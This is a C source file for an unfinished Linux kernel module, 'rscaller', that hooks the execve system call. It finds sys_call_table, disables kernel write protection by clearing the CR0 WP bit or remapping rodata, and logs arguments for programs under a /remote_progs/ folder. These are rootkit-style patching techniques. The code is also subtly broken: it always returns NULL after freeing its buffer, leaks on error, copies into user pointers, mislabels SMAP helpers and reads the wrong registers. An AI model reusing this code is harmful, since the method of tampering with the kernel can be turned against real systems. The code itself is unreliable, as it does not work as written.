#include "rscaller.h"


#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 

#include <linux/module.h>
#include <linux/sched.h>
#include <linux/mm.h>

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
unsigned long cr0;
#elif IS_ENABLED(CONFIG_ARM64)
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;
#define section_size init_begin - start_rodata
#endif

static unsigned long *__sys_call_table;
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_syscall;

#define REMOTE_PROGS_FOLDER "/remote_progs/"

unsigned long * get_syscall_table(void)
{
	unsigned long *syscall_table;
	
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
}


#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
}
#endif

static inline void smap_write_enable(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0);
#else
	write_cr0(cr0);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
			section_size, PAGE_KERNEL_RO);

#endif
}

static inline void smap_write_disable(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0 & ~0x00010000);
#else
	write_cr0(cr0 & ~0x00010000);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
			section_size, PAGE_KERNEL);
#endif
}

static inline void smap_rw_disable(void)
{
	stac();
}

static inline void smap_rw_enable(void)
{
	clac();
}

// void fetch_param_variant(SyscallParam *src, int param_type, void **param, size_t *param_size) {

// TODO: separately handle userspace char buffers
int save_syscall_param(SyscallParam *buf, long param, int param_idx, const SyscallSignature *signature)
{
	void* inner_buf;
	void* src_kernel;
	bool is_ptr = signature->params_meta[param_idx].is_ptr;
	int type_variant = signature->params_meta[param_idx].type;
	size_t param_size = signature->params_meta[param_idx].size;

	fetch_param_variant(buf, type_variant, &inner_buf, &param_size);

	// Here we handle all pointers except char buffers
	// param_size is taken from real size of struct
	if (is_ptr) {
		// pr_info("Trying to allocate %d bytes\n", param_size);
        src_kernel = kvmalloc(param_size, GFP_KERNEL);
        if (!src_kernel) {
            pr_err("Failed to allocate temp buf for syscall");
            return -ENOMEM; // it's good practice to return a proper error code
        }

        // Copy the data from user space to the kernel buffer
        if (copy_from_user(src_kernel, (const void __user *)inner_buf, param_size)) {
            kvfree(src_kernel); // Free the allocated buffer in case of failure
            pr_err("Failed to copy data from user space");
            return -EFAULT; // Return an error if copy fails
        }

        // Now use src_kernel as the source for memcpy
        memcpy(inner_buf, src_kernel, param_size);
        kvfree(src_kernel); // Free the allocated buffer after copying
    } 
	else {
        memcpy(inner_buf, (void *)param, param_size); // Unsafe, we should ensure 'param' is valid!
	}


	return 0;
}

Syscall* save_syscall(unsigned long *params, const SyscallSignature *signature) {
	Syscall* syscall;
	int ret;

	syscall = kvmalloc(sizeof(Syscall), GFP_KERNEL);
	if (syscall == NULL) {
		pr_err("Failed to alloc syscall buf");
		return NULL;
	}

	smap_rw_disable();
	for(int i = 0; i < signature->n_params; i++) {

		pr_info("Trying to save param %d", i);
		ret = save_syscall_param(&syscall->param_bufs[i], params[i], i, signature);
		if (ret == -1) {
			pr_err("Failed to save syscall params");
			return NULL;
		}
	}
	smap_rw_enable();

	pr_info("Saved syscall params");

err:
	kfree(syscall);
	return NULL;
}


// Might be needed in case if it will be more convenient to save additional meta
// inside ParamBuf
// param_prepare_meta(ParamBuffer *buf, const SyscallSignature *signature, int param_idx) {
// }


char *get_current_binary_path(void)
{
    struct mm_struct *mm;
    char *buf, *res;

    mm = current->mm;
    if (!mm || !mm->exe_file)
        return NULL;

    buf = kvmalloc(PATH_MAX, GFP_KERNEL);
    if (!buf)
        return NULL;

    res = d_path(&mm->exe_file->f_path, buf, PATH_MAX);
    if (IS_ERR(res)) {
        pr_err("d_path failed: %ld\n", PTR_ERR(res));
        kvfree(buf);
        return NULL;
    }

    res = kstrdup(res, GFP_KERNEL);
    kvfree(buf);
    return res;
}


bool filter_binary(void) {
	bool is_filtered;
	char  *binary = get_current_binary_path();

	if (binary == NULL) {
		return false;
	}
	
	is_filtered = !strstr(binary, REMOTE_PROGS_FOLDER);
	
	if (!is_filtered) {
		pr_info("%s performed syscall\n", binary);	
	}
	
	kvfree(binary);
	return is_filtered;
}

// TODO: add codegen or macro for syscall
asmlinkage int hooked_syscall(const struct pt_regs *pt_regs)
{
	int ret;
	SyscallSignature signature;
	Syscall *syscall;	
	memcpy(&signature, &signature__x64_sys_execve, sizeof(signature__x64_sys_execve));
	
	unsigned long params[6] = {
		pt_regs->bx,
		pt_regs->cx,
		pt_regs->dx,
		pt_regs->si,
		pt_regs->di,
		pt_regs->bp,
	};

	// Binary is outside of remote_progs folder
	if (filter_binary()) {
		return orig_syscall(pt_regs);
	}


	smap_write_disable();
	syscall = save_syscall((unsigned long*)&params, &signature);
	smap_write_enable();

	return orig_syscall(pt_regs);
}

int syscall_num = __NR_execve;

static int __init rscaller_init(void)
{
	__sys_call_table = get_syscall_table();
	if (!__sys_call_table)
		return -1;

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	cr0 = read_cr0();
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
#endif


	orig_syscall = (t_syscall)__sys_call_table[syscall_num];

	smap_write_disable();

	__sys_call_table[syscall_num] = (unsigned long) hooked_syscall;

	smap_write_enable();

	return 0;
}

static void __exit rscaller_cleanup(void)
{
	smap_write_disable();

	__sys_call_table[syscall_num] = (unsigned long) orig_syscall;

	smap_write_enable();
}

module_init(rscaller_init);
module_exit(rscaller_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("your mom");
MODULE_DESCRIPTION("Rscaller kmod");
